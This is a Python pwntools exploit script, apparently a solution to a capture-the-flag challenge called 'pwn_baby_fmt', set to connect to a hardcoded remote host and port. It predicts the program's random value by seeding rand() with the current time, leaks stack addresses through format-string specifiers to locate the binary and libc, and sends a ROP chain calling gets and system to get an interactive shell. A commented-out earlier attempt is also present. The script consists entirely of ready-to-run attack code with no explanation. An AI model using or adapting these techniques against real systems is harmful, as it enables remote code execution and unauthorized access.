#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('pwn_baby_fmt')

host = args.HOST or '104.248.42.88'
port = int(args.PORT or 2001)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

gdbscript = '''
continue
'''.format(**locals())

# -- Exploit goes here --

context.terminal = ['gnome-terminal', '-e']

from ctypes import CDLL

libc = CDLL('/lib64/libc.so.6')

_libc = ELF('./libc-2.31.so')
if args.LOCAL:
    _libc = ELF('/lib64/libc.so.6')


io = start()
"""
time = libc.time(0)
print (time)
libc.srand(time)

guess = libc.rand()
log.info('Guess {}'.format(guess))

io.recvuntil('?\n')

fmt = 'A%22$p'
io.sendline(fmt)

io.recvuntil('A')
addr = io.recvline().strip()
log.info('bin {}'.format(addr))
log.info(addr)
addr = int(addr, 16)
print ('addr', hex(addr))
exe_base = addr - 4544
log.info(hex(exe_base))

offset = cyclic_find(b'haaa')
rop = b'A'*5 + p32(guess) + cyclic(offset) + p64(exe_base + 0x138a)
io.recvuntil('?\n')
io.sendline(rop)
io.interactive()
"""

# -------------------
time = libc.time(0)
print (time)
libc.srand(time)

guess = libc.rand()
log.info('Guess {}'.format(guess))

io.recvuntil('?\n')

fmt = 'A%15$p'
io.sendline(fmt)

io.recvuntil('A')
addr = io.recvline().strip()
log.info(addr)
libc_base = int(addr, 16) - _libc.symbols['__libc_start_main'] - 243
log.info('libc {}'.format(hex(libc_base)))

_libc.address = libc_base
rop = ROP(_libc)
rop.gets(libc_base + 2011136 + 1000)#+ 1855488 - 1000)
rop.system(libc_base + 2011136 + 1000)#+ 1855488 - 1000)
rop.raw(0xdeadbeef)

offset = cyclic_find(b'haaa')
rop = b'A'*5 + p32(guess) + cyclic(offset) + rop.chain()
io.recvuntil('?\n')
io.sendline(rop)
#io.sendline('ls -la\x00')

io.interactive()

